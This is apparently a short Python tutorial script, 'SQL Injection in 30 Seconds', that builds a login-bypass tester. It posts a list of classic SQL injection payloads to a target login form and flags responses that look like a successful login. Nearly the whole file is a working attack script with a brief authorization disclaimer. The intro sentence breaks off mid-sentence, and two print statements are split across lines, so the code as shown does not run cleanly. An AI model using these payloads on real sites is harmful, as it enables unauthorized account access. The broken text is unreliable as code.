#!/usr/bin/env python3
"""
SQL Injection in 30 Seconds
===========================
Ever wonder how hackers steal data from websites? It's often with SQL injection. Here's how it works: When you log into a site, it asks your username and password. The website builds a database query 

⚠️  EDUCATIONAL PURPOSES ONLY — Get proper authorization before testing.
📺  Watch the video walkthrough on our Instagram!
📅  2026-03-02 23:02:49
"""

import requests
import sys
from urllib.parse import quote

class SQLiTester:
    """A basic SQL injection vulnerability tester for login bypass"""
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def test_login_bypass(self, username_field='username', password_field='password'):
        """Test common SQL injection payloads on login form"""
        
        # Common SQL injection payloads for authentication bypass
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "' OR 1=1 --",
            "' UNION SELECT null, null --"
        ]
        
        print(f"[+] Testing SQL injection on {self.target_url}")
        print(f"[+] Using field names: {username_field}, {password_field}
")
        
        for payload in payloads:
            # Prepare the POST data with malicious payload
            data = {
                username_field: payload,
                password_field: 'test123'  # Any password
            }
            
            try:
                response = self.session.post(self.target_url, data=data, timeout=5)
                
                # Check for successful bypass indicators
                if response.status_code == 200:
                    # Common indicators of successful login
                    indicators = ['welcome', 'dashboard', 'logout', 'profile']
                    
                    if any(indicator in response.text.lower() for indicator in indicators):
                        print(f"[!] POTENTIAL VULNERABILITY FOUND!")
                        print(f"    Payload: {payload}")
                        print(f"    Response length: {len(response.text)} chars")
                        print(f"    Status code: {response.status_code}
")
                        return True
                        
            except requests.exceptions.RequestException as e:
                print(f"[-] Error with payload {payload}: {e}")
                
        print("[-] No obvious vulnerabilities found with tested payloads")
        return False

# Example usage
if __name__ == "__main__":
    # WARNING: Only test on systems you own or have permission to test
    test_url = "http://vulnerable-site.com/login.php"
    tester = SQLiTester(test_url)
    tester.test_login_bypass()
